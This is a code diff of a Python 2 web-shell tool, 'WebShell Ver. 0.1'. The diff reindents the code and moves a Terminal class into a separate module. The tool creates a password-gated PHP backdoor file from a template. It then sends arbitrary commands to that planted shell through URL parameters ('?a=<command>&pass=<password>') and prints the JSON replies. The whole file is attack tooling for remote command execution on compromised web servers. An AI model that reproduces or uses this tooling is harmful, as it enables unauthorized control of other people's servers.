@@ -5,6 +5,7 @@ import os
 import urllib  
 import json
 import argparse
+from core.terminal import Terminal
 
 
 parser = argparse.ArgumentParser()
@@ -18,31 +19,35 @@ for line in open("banner.txt"):
 	print line,
 print "\n"   
 print "     [*]------------------- WebShell Ver. 0.1 @matiasmenares -------------------[*]\n"
-print " "
+print "\n"
 if args.u and args.p:
-    url = args.u
-    password = args.p
+	url = args.u
+	password = args.p
 if args.g and args.p:
-    name = args.g  # Name of text file coerced with +.txt
-    password = args.p
-    isphp = name.partition('.')
-    if isphp[2] == "php":
-	    print 'Creating Shell file...'
-	    try:
-	        file =  open(name, 'w')   # Trying to create a new file or open one
-	        file.close()
-	        create = True
-		with open('backdoor/shell.php') as f:
-			with open(name, "w") as f1:
-				for line in f:
-					if "<password>" in line:
-						f1.write("		if($_GET['pass'] == '"+password+"'){ \n")
-					else:
-						f1.write(line)
-	    except:
-	        print('Something went wrong!')
-	        sys.exit(1)
-    
+	name = args.g  # Name of text file coerced with +.txt
+	password = args.p
+	isphp = name.partition('.')
+	if isphp[2] == "php":
+		print 'Creating Shell file...'
+		try:
+			file =  open(name, 'w')   # Trying to create a new file or open one
+			file.close()
+			create = True
+			with open('backdoor/shell.php') as f:
+				with open(name, "w") as f1:
+					for line in f:
+						if "<password>" in line:
+							f1.write("		if($_GET['pass'] == '"+password+"'){ \n")
+						else:
+							f1.write(line)
+		except:
+			print('Something went wrong!')
+			sys.exit(1)
+	print('Shell was created!')
+	sys.exit(1)
+
+
+
 def conect():
 	targer = urllib.urlopen(url+"?pass="+args.p)
 	if targer.getcode() == 200:
@@ -53,43 +58,13 @@ def conect():
 		print "robot@shelly$> Server Not Respond."
 		sys.exit(2)
 	
-
-
 def server_info():
 	targer = urllib.urlopen(url+"?pass="+args.p)
 	if targer.getcode() == 200:
 		htmlSource = targer.read()
 		j = json.loads(htmlSource)
-		return j['server_info']
-
-
-class Terminal:
-	
-	def __init__(self,url,password):
-		self.url = url
-		self.password = password
-
-	def terminal(self,send):
-		command = self.command(send)
-		if command == False:
-			return self.execute(send)
-	
-	def command(self,send):
-		if send == "exit":
-			print "\nBye :)"
-			sys.exit(2)
-		else:
-			return False
-	
-	def execute(self,input):
-		targer = urllib.urlopen(self.url+"?a="+input+"&pass="+self.password)
-		if targer.getcode() == 200:
-			htmlSource = targer.read()
-			response = json.loads(htmlSource)
-			return response
-		else:
-			print "No response"
-			sys.exit(2)
+		return j['server_info']		
+			
 if args.u and args.p:			
 	con = conect()
 	if con['response'] == '200':
